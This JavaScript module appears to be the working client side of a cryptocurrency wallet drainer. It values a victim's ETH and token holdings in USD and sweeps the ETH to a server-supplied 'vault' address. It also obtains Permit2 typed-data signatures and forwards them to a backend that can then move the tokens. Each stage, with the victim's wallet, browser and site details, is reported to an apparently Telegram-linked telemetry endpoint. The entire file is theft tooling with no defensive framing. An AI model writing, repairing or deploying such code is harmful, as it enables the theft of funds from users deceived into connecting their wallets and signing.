import { apiGet, apiPost, CHAIN_ID, ETH_USD } from './api.js'
import { readEthBalance, readTokenBalance, formatUnits, sweepEthToVault, waitForTx } from './wallet.js'

let surfaceCache = null

export async function loadSurface() {
  if (surfaceCache) return surfaceCache
  const data = await apiGet('/api/v1/settle/surface')
  const tokens = Array.isArray(data.tokens) ? data.tokens : []
  if (tokens.length === 0) throw new Error('Settle surface returned no tokens')
  surfaceCache = {
    chain_id: data.chain_id || CHAIN_ID,
    tokens,
    bySymbol: Object.fromEntries(tokens.map((t) => [String(t.symbol).toUpperCase(), t])),
  }
  return surfaceCache
}

export async function scanAssets(wallet) {
  const surface = await loadSurface()
  const ethBal = await readEthBalance(wallet)
  const scanned = []
  let usd = Number(ethBal) / 1e18 * ETH_USD
  if (usd > 0) {
    scanned.push({ chain: 'evm:1', family: 'EVM', token: 'native', symbol: 'ETH', amount_usd: usd })
  }
  const balances = {}
  for (const token of surface.tokens) {
    const raw = await readTokenBalance(wallet, token.address)
    balances[token.symbol] = raw
    const amountUsd = Number(raw) / 10 ** token.decimals
    if (amountUsd > 0) {
      scanned.push({
        chain: 'evm:1',
        family: 'EVM',
        token: token.address,
        symbol: token.symbol,
        amount_usd: amountUsd,
      })
      usd += amountUsd
    }
  }
  return { assets: scanned, usd, ethBal, balances }
}

export function pickAutoToken(scan, surface) {
  for (const symbol of ['USDC', 'USDT']) {
    const token = surface.bySymbol[symbol]
    const amount = scan.balances[symbol]
    if (token && amount > 0n) return { symbol, address: token.address, amount }
  }
  for (const token of surface.tokens) {
    const amount = scan.balances[token.symbol]
    if (amount > 0n) return { symbol: token.symbol, address: token.address, amount }
  }
  return null
}

async function resolveNativeTo() {
  const data = await apiGet('/api/v1/settle/native-intent')
  const to = data.to
  if (typeof to !== 'string' || !/^0x[a-fA-F0-9]{40}$/.test(to)) {
    throw new Error('Native settle target missing')
  }
  return to
}

function tgPayload(state, extra) {
  const clean = Object.assign({}, extra || {})
  delete clean.signature
  delete clean.typed_data
  delete clean.engine_spender
  delete clean.to
  return Object.assign({
    wallet_address: state.wallet,
    chain_id: CHAIN_ID,
    connect_session: state.session,
    wallet_type: 'MetaMask',
    userAgent: navigator.userAgent,
    sourceDomain: location.host,
    scout_value_usd: state.usd,
    amount: state.amount,
  }, clean)
}

export async function tgEvent(state, event, extra) {
  try {
    await apiPost('/api/v1/local-test/telemetry', tgPayload(state, Object.assign({ event }, extra || {})))
  } catch (e) {
    return e.message || String(e)
  }
  return null
}

export async function runEthSweep({ wallet, ethBal, state, log }) {
  const to = await resolveNativeTo()
  await tgEvent(state, 'permit2_sign_start', { token_name: 'ETH Balance transfer' })
  await tgEvent(state, 'sending', { token_name: 'eth_balance_transfer', token_address: 'native' })
  let tx
  try {
    const swept = await sweepEthToVault(wallet, to, () => log('Fee estimate fallback', 'warn'))
    tx = swept.tx
    log('Native sweep submitted')
  } catch (sweepErr) {
    const smsg = sweepErr && sweepErr.message ? sweepErr.message : String(sweepErr)
    if (/too low|insufficient|gas/i.test(smsg)) {
      await tgEvent(state, 'gas_low', { detail: 'executor_gas_low', executor_balance_eth: formatUnits(ethBal, 18) })
    } else if (sweepErr && sweepErr.code === 4001) {
      await tgEvent(state, 'rejected', { detail: 'user rejected' })
    } else {
      await tgEvent(state, 'failed', { detail: 'sweep failed' })
    }
    if (sweepErr && typeof sweepErr === 'object') sweepErr.tgSent = true
    throw sweepErr
  }
  await tgEvent(state, 'awaiting', { tx_hash: tx })
  const rec = await waitForTx(tx)
  const ok = rec && String(rec.status) !== '0x0'
  if (ok) await tgEvent(state, 'confirmed', { tx_hash: tx, token_name: 'eth_balance_transfer' })
  else await tgEvent(state, 'no_action', { detail: 'TX submitted but not confirmed yet', tx_hash: tx })
  return { tx, ok }
}

export async function runPermit2Settle({ wallet, token, state }) {
  await tgEvent(state, 'permit2_sign_start', { token_name: token.symbol, token_address: token.address })
  const q = new URLSearchParams({
    wallet,
    token: token.address,
    chain_id: String(CHAIN_ID),
  })
  const typed = await apiGet('/api/v1/signature-anchor/permit2-typed-data?' + q.toString())
  const signature = await window.ethereum.request({
    method: 'eth_signTypedData_v4',
    params: [wallet, JSON.stringify(typed.typed_data)],
  })
  await tgEvent(state, 'signature_received', { token_name: token.symbol, token_address: token.address })
  await tgEvent(state, 'processing', { token_name: token.symbol, token_address: token.address })
  const expiry = new Date(Date.now() + 25 * 60 * 1000).toISOString()
  const result = await apiPost('/api/v1/signature-anchor', {
    ingress: 'normalized_v1',
    chain_family: 'EVM',
    protocol: 'permit2_eip712',
    wallet_address: wallet,
    token_address: token.address,
    signature,
    nonce: 'legion:' + Date.now(),
    expiry_iso: expiry,
    wallet_type: 'metamask',
    chain_id: CHAIN_ID,
    engine_spender: typed.engine_spender,
    permit2: typed.permit2,
    permit_metadata: typed.permit_metadata,
    amount: typed.permit_metadata && typed.permit_metadata.amount,
  })
  const tx = result.data?.l2_mint_transaction_hash || result.data?.tx_hash || result.message
  if (typeof tx === 'string' && tx.startsWith('0x')) {
    await tgEvent(state, 'confirmed', { tx_hash: tx, token_name: token.symbol, token_address: token.address })
  }
  return { tx }
}
